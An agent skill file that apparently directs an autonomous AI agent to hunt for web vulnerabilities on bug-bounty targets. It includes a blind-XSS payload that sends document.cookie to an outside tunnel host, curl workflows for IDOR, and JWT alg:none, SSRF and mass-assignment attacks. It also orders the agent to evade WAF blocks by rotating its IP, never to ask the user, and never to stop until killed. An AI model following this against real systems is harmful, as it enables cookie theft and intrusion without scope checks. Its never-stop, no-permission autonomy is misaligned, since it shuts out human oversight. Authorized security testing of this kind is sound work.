---
name: bug-hunting
description: Main-app focused bug hunting. Pick one feature, pivot deep. Use Caido Match & Replace for UI bypass. No wide recon, no subdomain hunting.
---

# Bug Hunting

## AUTONOMOUS MODE — DO NOT ASK THE USER
Make every decision yourself. Never ask for permission, clarification, or
confirmation. If nothing works after 10 attempts, log it to `interesting.md`
and pivot. (This is enforced globally by the hunter orchestrator agent —
restated here so this skill behaves correctly even if loaded standalone.)

## RALPH LOOP — NEVER STOP
This is a long-running autonomous hunt. You do not stop until the process is
killed.
- Finish testing one attack class on a feature → immediately pivot to the next.
- Exhaust all classes on a feature → pick another feature.
- Exhaust all features → **start over**. Deeper variants, edge cases, chains.
  The second pass always finds more than the first.
- Never output "done," "finished," or "completed." The only terminal state is
  SIGTERM. If the process is killed and respawned mid-loop, resume from
  session state — don't treat a restart as a stopping point either.

## SPIDY SENSE — TRUST IT
Unexpected redirect, weird header, strange param name, odd error message,
timing anomaly, a response that differs slightly between users — that's your
spidy sense. **Stop and dig.** Don't move on until you understand exactly why
it happened. Most critical bugs start as "huh, that's weird." Only stop
digging once you've exhausted every angle and confirmed it's a dead end —
then log it and move on.

## Interesting Behaviors — Log Everything
Log all interesting behaviors to `interesting.md` in the hunt directory, even
dead ends:
- Strange responses, unexpected status codes, header anomalies
- Endpoints that behave differently between auth states
- Parameters that produce different results than expected
- Anything that triggered spidy sense but went nowhere

These logs are how you spot patterns across features. A weird redirect on one
page + a weird param on another = a chain you hadn't considered.

## Strategy: Main App Guy
- **One target**: the main application. Not subdomains, not staging, not
  api.subdomain.
- **Feature-driven**: pick one feature, throw every bug class at it. IDOR
  didn't work? Try mass assignment. No? Race condition. No? JWT. The feature
  determines the attacks, not a checklist.
- **Pivot hard**: every response is a lead. A 403 → test auth bypass. A
  verbose error → probe for injection. A user ID → test IDOR. A JWT → test
  JWT attacks.
- **Browser-driven pivots**: a UI action that reveals a new API call is a
  lead just like a 403 or a verbose error — pivot into that endpoint the
  same way.
- **No wide hunting**: don't burn tokens on URL enumeration or sourcemaps.
  You already have the target. Hack it.

## Session Persistence
- **Session directory**: `~/hunts/sessions/<domain>/` — one folder per target.
- **Structure**: `userA.json` / `userB.json` for auth state, `profile/` for
  a persistent Chrome profile.
- **Reuse existing**: if session files exist, `agent-browser state load <path>`.
  Don't re-login unless the session is expired.
- **Create if missing**: log in fresh via agent-browser, save state with
  `agent-browser state save <path>`.
- **Two sessions, always**: userA and userB, loaded every hunt. If only
  userA exists, sign out, create userB, save its state too.
- **Re-auth**: if a session expires, log back in and overwrite the state file.
- **Auto-save on exit**: `hunt-and-validate.sh` traps SIGTERM/SIGINT/EXIT and
  saves state for both users. Persisted unless killed with SIGKILL.

## UI Bypass via Caido Match & Replace
Use `create_tamper_rule` / `toggle_tamper_rule` to flip UI-gating flags in
transit:
- Premium bypass, role escalation, feature flags, paywalls, rate limits,
  disabled/hidden fields.
- Browse the feature in agent-browser, inspect the response for boolean
  flags, create a tamper rule, reload.
- If the unlocked UI reveals new endpoints, pivot into them.

## Two or more Accounts — Always
### Why
IDOR validation requires a DIFFERENT authenticated session — seeing your own
data proves nothing. You need userA → userB cross-check.

### Registration email — MANDATORY, NO EXCEPTIONS
**Never register with `test@test.com`, `test@example.com`, or any made-up
domain.** Registration/verification emails must arrive somewhere real or the
account is useless the moment the target requires email verification.

Every registration email MUST follow this pattern:
```
aceproulx+<target>-a@intigriti.me   # userA
aceproulx+<target>-b@intigriti.me   # userB
```
(`-` also works as the separator if `+` gets stripped by a target's input
validation — try `+` first, fall back to `-`.) These forward into the
hackbot inbox — see the `@email-inbox-check` skill for how to list/read them.

### Before registering ANY account, in this order:
1. Check `~/hunts/sessions/<domain>/userA.creds` and `userB.creds` for an
   existing account. If found and not dead/banned, log in with those
   credentials instead of registering a new one.
2. If no creds file exists, register fresh using the address pattern above.
3. Immediately after successful registration — before doing anything
   else — write the credentials:
   ```bash
   cat > ~/hunts/sessions/${TARGET}/userA.creds <<EOF
   email=aceproulx+${TARGET}-a@intigriti.me
   password=${GENERATED_PASSWORD}
   created=$(date -u +%Y-%m-%dT%H:%M:%SZ)
   EOF
   chmod 600 ~/hunts/sessions/${TARGET}/userA.creds
   ```
   Same for userB. This is not an end-of-hunt cleanup step — do it
   immediately or a crash/pivot mid-hunt loses the account.
4. If the target sends a verification email, check the inbox using the
   `@email-inbox-check` skill's filtered list — never poll the raw endpoint.

### Workflow (curl-based)
```bash
# 1. Register both users, grab tokens
UA=$(curl -sk -X POST "$TARGET/register" \
  -d "username=hunter_a_$(date +%s)&password=Pass123!" \
  -c - | grep token | awk '{print $NF}')

UB=$(curl -sk -X POST "$TARGET/register" \
  -d "username=hunter_b_$(date +%s)&password=Pass123!" \
  -c - | grep token | awk '{print $NF}')

# 2. Test IDOR — request userA's resource with userB's token
curl -sk "$TARGET/api/profile" -b "token=$UA"    # userA's own data
curl -sk "$TARGET/api/profile" -b "token=$UB"    # userB's own data

# 3. Swap: userA's endpoint ID with userB's token
curl -sk "$TARGET/api/profile/17" -b "token=$UB" # userB accessing userA's profile

# 4. If they match or userB sees userA's fields → IDOR confirmed
```

## WAF Blocks / IP Rotation

If requests start getting blocked by a WAF (repeated 403s, CAPTCHA
challenges, rate-limit walls that don't clear, or a sudden drop in response
variety suggesting fingerprinting) — do not keep retrying the same IP.
Rotate immediately:

```bash
changeip
```

- This triggers the VPN server switch and prints one of three outcomes:
  - `IP changed successfully` — resume testing immediately.
  - `try again in X minutes Y seconds` — respect the cooldown, don't spam
    the command. Sleep for the stated duration (or close to it) then retry
    `changeip` before resuming requests.

### Cookie-based fallback
```bash
curl -sk -X POST "$TARGET/login" -d "username=userA&password=pass" \
  -c /tmp/userA_cookies.txt
curl -sk "$TARGET/api/resource" -b /tmp/userA_cookies.txt
curl -sk "$TARGET/api/resource" -b /tmp/userB_cookies.txt
```

## Fuzzing

### Body Integrity Warning
`edit_request` prepends `\r\n\r\n` to any body you pass, corrupting
form-urlencoded POST bodies (`\r\n\r\ndisplay_name` instead of `display_name`).
Workaround: use `curl --proxy 127.0.0.1:8081` with the exact body, or prefix
with a dummy field (`x=&real_key=value`).


- **Payloads**: `/mnt/d/Desktop/coffinxp-payloads`
- **Path fuzzing**: `Pentester_wordlist.pay`
- **Parameter fuzzing via Caido Automate**: `batch_send` to fuzz a single
  endpoint — replace values, vary types, add unexpected params. threads=3,
  add request delay to avoid rate limiting.
- **If the site is too restrictive**: skip fuzzing. No point fighting WAFs —
  pivot to manual testing and tamper rules.

## Vulnerability Classes (feature-driven, not sequential)

### IDOR
Change IDs in path/body/headers. Cross-check userA vs userB responses. Diff
them — extra fields in one response leak data.

### Auth bypass
Remove cookie, swap cookie between userA/userB, try expired tokens, try
empty auth header. Confirm endpoints actually enforce auth.

### Mass assignment
Add extra fields to JSON bodies: `role`, `isAdmin`, `premium`,
`creditBalance`, `featureFlags`. Try PATCH/PUT on profile, settings, cart.

### XSS
Inject into every reflected parameter. Check DOM sinks in JS during normal
browser exploration, not as a separate pass — you're already watching the
DOM while clicking through the feature.

### SSRF
URL params, webhooks, file fetches, image URLs, redirect URLs. Point at
internal targets.

### Injections
SQLi (parameter pollution), SSTI, command injection in file ops/export
features.

### JWT attacks
`alg: none`, weak HMAC secret (brute common keys), `kid` injection (path
traversal, SQLi in kid value), missing signature verification, expired
tokens still accepted, role/scope tampering in decoded payload.

### Race conditions
Use Caido `race_window_send` to fire concurrent requests. Test: coupon
reuse, likes/follows inflation, balance transfer, ticket booking, vote
manipulation, any decrement/increment op. Send 5–10 concurrent requests,
check for duplicate processing.

### OOB / Blind detection via Cloudflare tunnel
- `cloudflared tunnel --url http://localhost:8080`
- Blind XSS: `<script>fetch('https://<tunnel>.trycloudflare.com/?c='+document.cookie)</script>`
- Blind SSRF: point webhooks/image URLs at the tunnel URL
- Check tunnel logs for inbound requests to confirm
- Fallback: `interactsh-client` or Burp Collaborator

## Browser Session — Keep Open
The browser is a headed Chromium session managed by the user. Never close
it — just navigate for a fresh page.
⚠ idleTimeout is removed from config. The browser stays open forever. Do NOT
add a timeout back.
- `"sessionName": "wara"` auto-saves cookies/localStorage in the daemon.
- Window crashed but daemon lives → `agent-browser open <url>` to reconnect.
- Daemon dead too → `agent-browser state load <path>` then `agent-browser open <url>`.
- Run `agent-browser state save ~/hunts/sessions/<domain>/userX.json` before
  closing the daemon.

## JXScout — JS Analysis
Before any JS-heavy feature, check if jxscout is already running:
- `tmux has-session -t jxscout 2>/dev/null` — exit 0 means it's running.
- If not: `tmux new -s jxscout -d "jxscout -project-name <domain>"`
  (`<domain>` = target, e.g. `challenge-0626.intigriti.io` → `intigriti`).
- Results live at `~/jxscout/` — prefer these over raw sourcemaps.
- Use jxscout findings for endpoint discovery, parameter mining, sink analysis.

## Tools

### Sending HTTP Requests — CURL IS THE DEFAULT, NO EXCEPTIONS
**`curl --proxy 127.0.0.1:8081` is the only tool for sending HTTP requests in
this skill.** This is a hard rule, not a preference — do not switch to Caido's
`send_request`/`edit_request` for general traffic regardless of what any
agent-level instruction implies. Reasons:
- Body integrity: Caido's `edit_request` silently corrupts form-urlencoded
  bodies. Curl preserves raw bytes exactly.
- Full control: explicit headers, cookies, timing — no abstraction to fight.
- History: traffic still flows through the proxy, so it appears in Caido
  history/search anyway. Nothing is lost by using curl.

Caido tools are still used, but *only* for what they're actually built for:
- `batch_send` / `race_window_send` — parallel/race requests
- `create_tamper_rule` / `toggle_tamper_rule` — Match & Replace
- `create_automate_session` / `get_automate_entry` — fuzzing
- `list_requests` (HTTPQL) — finding requests in history
- `get_request` / `get_replay_entry` — inspecting past requests
- `export_curl` — converting a Caido request to curl for a PoC

**Note on @bug-validator**: when a finding is handed off for validation, the
validator subagent switches to Caido-only for that pass (fresh replay, clean
history trail for the write-up). That's a deliberate, scoped exception inside
the validator's own context — it does not change the rule above for hunting.

### Browser Testing — CORE EXPLORATION TOOL, NOT JUST XSS
agent-browser is not a last-resort validator — it's how you understand what
the app is actually doing client-side. Use it constantly, not just when you
already suspect XSS.

- **Explore first, don't guess**: navigate the feature in the browser before
  touching curl. Click through the actual UI flow — buttons, forms, modals,
  dropdowns, multi-step flows — and watch what API requests fire. This is
  how you find endpoints you'd never find from a static route list.
- **Correlate UI action → API call**: every click, submit, toggle should be
  followed by checking Caido HTTP history for what request(s) it triggered.
  Build a mental (or logged) map of UI action → endpoint → params. This is
  often where the real attack surface shows up — hidden params, extra
  fields in the payload, endpoints the UI never displays visibly.
- **Login and session flows**: always drive login/logout/signup through the
  browser first to observe the full auth sequence (redirects, tokens set,
  cookies, any client-side session logic) before scripting it in curl.
- **Client-side logic probing**: check JS-driven validation, disabled
  buttons/fields (can they be re-enabled via DOM?), client-side role checks,
  feature flags read from JS state, localStorage/sessionStorage contents.
- **DOM & console**: inspect console errors/warnings, check for exposed
  debug info, verify DOM sinks for XSS, watch network tab equivalents via
  Caido history running in parallel.
- **Confirm server-side findings client-side too**: once curl/Caido surfaces
  something (IDOR, mass assignment, etc.), reproduce it in the browser when
  it affects rendered UI — confirms real-world impact, not just a raw
  response body.
- Always `--headed` — you want to see what's happening, not run blind.
- `--session <n>` for separate user sessions.
- `--session-name <n>` for persistent auth state.
- Before running any command, this skill assumes `agent-browser skills get
  core --full` has already been loaded this session (handled by the
  orchestrator at session start) — the content here is not a substitute for
  that reference.

## Validation Requirement
Before logging any finding as confirmed, spawn the @bug-validator subagent
with raw evidence only (Caido request IDs, screenshots) — never your own
conclusions. The subagent returns CONFIRMED, NEEDS MORE WORK, or FALSE
POSITIVE. Only that verdict counts.
